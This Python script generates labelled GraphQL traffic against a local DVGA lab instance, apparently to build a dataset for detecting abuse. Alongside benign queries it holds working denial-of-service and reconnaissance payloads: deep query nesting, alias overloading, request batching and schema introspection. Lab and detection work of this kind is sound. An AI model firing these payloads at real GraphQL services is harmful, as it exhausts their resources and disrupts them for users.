"""traffic_gen.py - labelled lab traffic against YOUR OWN local DVGA instance."""
import random
import time

import requests

URL = "http://localhost:5013/graphql"          # DVGA running locally
PROXY = {"http": "http://127.0.0.1:8080"}      # mitmproxy capture
ROUNDS = 100

BENIGN = [
    {"query": "query { systemHealth }"},
    {"query": "query { pastes { id title } }"},
    {"query": "query { paste(id: 1) { id content owner { name } } }"},
    {"query": "query { pastes { id title owner { id name } } users { id name } }"},
]


def nested(depth):                    # deep-nesting abuse
    q = "id"
    for _ in range(depth):
        q = "pastes { owner { " + q + " } }"
    return {"query": "query { " + q + " }"}


def aliased(n):                       # alias-based overloading
    body = " ".join(f"a{i}: systemHealth" for i in range(n))
    return {"query": "query { " + body + " }"}


def batched(n):                       # array batching abuse
    return [{"query": "query { systemHealth }"}] * n


INTROSPECTION = [
    {"query": "query { __schema { types { name fields { name } } } }"},
    {"query": "query { __schema { queryType { name } types { name kind } } }"},
    {"query": "query { __type(name: \"PasteObject\") { name fields { name } } }"},
    {"query": "query { __schema { types { name fields { name args { name } } } } }"},
]


def send(payload, label):
    try:
        requests.post(URL, json=payload, headers={"X-Label": label},
                      proxies=PROXY, timeout=120)
    except requests.RequestException as e:
        print("  request failed:", label, type(e).__name__)


if __name__ == "__main__":
    for i in range(ROUNDS):
        send(random.choice(BENIGN), "benign")
        send(nested(random.randint(6, 12)), "deep_nesting")
        send(aliased(random.randint(50, 150)), "alias_overload")
        send(batched(random.randint(20, 80)), "batch_abuse")
        send(random.choice(INTROSPECTION), "introspection_abuse")
        print("round", i + 1, "of", ROUNDS)
        time.sleep(random.uniform(0.05, 0.5))